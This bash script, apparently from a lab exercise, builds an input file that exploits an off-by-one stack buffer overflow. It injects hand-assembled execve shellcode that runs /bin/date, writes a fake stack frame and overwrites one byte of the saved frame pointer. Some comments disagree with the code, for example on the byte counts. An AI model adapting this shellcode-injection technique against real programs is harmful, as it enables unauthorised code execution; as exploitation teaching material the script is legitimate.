#!/bin/bash

# run "off_by_one" with "env -" to get the
# same stack addresses as I have in this file
#
# assuming EBP is 0xbffffe58 in echo_name
# assuming saved EBP is 0xbffffe78 in echo_name
# bogus stack frame from 0xbffffe38 
# buff starts from 0xbffffd58
# injected code starts from 0xbffffd78
# string "/bin/date" starts from 0xbffffd64
# argv[] starts from 0xbffffd70
# env[], which is empty, starts from 0xbffffd74

# write my name to buff and its padding
perl -e 'print "DADA WIT\0\0\0\0";'  > input.txt

# write the bash path to stack
perl -e 'print "/bin/date\x0\x0\x0";' >> input.txt

# generate the arguments array: argv[]
perl -e 'print "\x64\xfd\xff\xbf";' >> input.txt
perl -e 'print "\x0"x4;' >> input.txt # NULl terminated  

# inject "xorl %eax, %eax"
perl -e 'print "\x31\xc0";'  >> input.txt

# inject "movl $0xb, %al"
perl -e 'print "\xb0\x0b";' >> input.txt

# inject "movl $0xbffffd64,%ebx"
perl -e 'print "\xbb\x64\xfd\xff\xbf";' >> input.txt

# inject "movl $0xbffffd70,%ecx"
perl -e 'print "\xb9\x70\xfd\xff\xbf";' >> input.txt

# inject "movl $0xbffffd74,%edx"
perl -e 'print "\xba\x74\xfd\xff\xbf";' >> input.txt

# inject "int $0x80"
perl -e 'print "\xcd\x80";' >> input.txt

# write garbage to the rest 123 bytes
perl -e 'print "X"x147;' >> input.txt

# write a fake stack frame for function main,
perl -e 'print "\x0"x24;'  >> input.txt
perl -e 'print "\x0"x4;' >> input.txt  # fake saved EBP 
perl -e 'print "\x78\xfd\xff\xbf";' >> input.txt # new return address, pointing to inserted code

# write more garbage 24 bytes
perl -e 'print "X"x24;' >> input.txt

# write the last one byte
perl -e 'print "\x38";' >> input.txt
